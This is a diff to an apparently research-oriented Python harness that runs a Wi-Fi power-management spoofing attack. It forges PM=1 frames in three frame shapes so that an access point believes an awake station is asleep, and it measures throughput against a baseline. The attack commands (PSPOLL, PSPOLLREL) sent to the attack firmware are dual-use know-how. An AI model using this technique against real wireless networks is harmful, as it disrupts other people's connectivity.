@@ -227,29 +227,29 @@ def main():
         results["baseline awake"] = phase("baseline awake (ps 0, no attack)", attack,
                                           args.seconds, ports)
 
-        # PM=1 spoof: the station is awake, the AP is told it sleeps.
-        results["pm spoof"] = phase(
-            "PM spoof (forged PM=1 Null Data)", attack, args.seconds, ports,
-            "PSPOLL %d %s" % (index, victim_token))
-        results["release"] = phase("release (PSPOLLREL: PM=0 sent, attack stopped)", attack,
-                                   args.seconds, ports, "PSPOLLREL")
-
-        board_sta.send("ps 1")
-        print("\nsta:", board_sta.expect("OK ps=1", 5.0) or "ps not applied")
-        results["baseline ps"] = phase("baseline ps (ps 1, no attack)", attack,
-                                       args.seconds, ports)
+        # Same attack, three carriers for the PM bit: stacks disagree about which
+        # frame they honour, so each is measured against the same baseline.
+        for shape in ("null", "qosnull", "action"):
+            results[shape] = phase(
+                "PM spoof, shape=%s" % shape, attack, args.seconds, ports,
+                "PSPOLL %d %s %s" % (index, victim_token, shape))
+            results[shape + " release"] = phase(
+                "release after %s (PSPOLLREL: PM=0 sent)" % shape, attack, args.seconds,
+                ports, "PSPOLLREL")
 
         info = status_of(attack)
-        print("\nSTATUS psp=%s pspf=%s pspnul=%s pspfl=%s pspc=%s pspdl=%s "
+        print("\nSTATUS psp=%s pspfrm=%s pspf=%s pspnul=%s pspfl=%s pspc=%s pspdl=%s "
               "psprxp=%s psprxn=%s psprxpm=%s txg=%s txgerr=%s"
-              % (info.get("psp"), info.get("pspf"), info.get("pspnul"), info.get("pspfl"),
-                 info.get("pspc"), info.get("pspdl"), info.get("psprxp"), info.get("psprxn"),
-                 info.get("psprxpm"), info.get("txg"), info.get("txgerr")))
+              % (info.get("psp"), info.get("pspfrm"), info.get("pspf"), info.get("pspnul"),
+                 info.get("pspfl"), info.get("pspc"), info.get("pspdl"), info.get("psprxp"),
+                 info.get("psprxn"), info.get("psprxpm"), info.get("txg"),
+                 info.get("txgerr")))
 
         base = results["baseline awake"]["ap"]
         base = statistics.mean(base) if base else float("nan")
         print("\nsummary (AP-side RATE KiB/s, 'baseline awake'=%.0f):" % base)
-        for name in ("baseline awake", "pm spoof", "release", "baseline ps"):
+        for name in ("baseline awake", "null", "null release", "qosnull",
+                     "qosnull release", "action", "action release"):
             res = results.get(name)
             if not res or not res["ap"]:
                 continue
